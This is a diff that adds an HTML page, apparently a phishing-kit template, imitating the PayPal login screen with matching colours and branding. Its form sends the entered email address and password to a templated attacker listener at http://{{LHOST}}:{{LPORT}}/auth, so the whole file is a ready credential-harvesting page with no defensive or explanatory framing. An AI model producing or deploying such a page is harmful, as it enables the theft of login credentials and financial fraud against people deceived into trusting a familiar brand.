@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Log in to your PayPal account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #f5f7fa; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 5px; width: 340px; text-align: center; border: 1px solid #eaeced; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        h2 { color: #003087; font-weight: normal; margin-bottom: 30px; font-size: 24px; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #9da3a6; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
+        input:focus { border-color: #0079c1; outline: none; box-shadow: 0 0 5px rgba(0,121,193,0.3); }
+        button { width: 100%; padding: 14px; background-color: #0070ba; color: white; border: none; border-radius: 24px; font-weight: bold; font-size: 15px; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #005ea6; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>PayPal</h2>
+        <form action="http://{{LHOST}}:{{LPORT}}/auth" method="POST">
+            <input type="email" name="email" placeholder="Email or mobile number" required>
+            <input type="password" name="pass" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
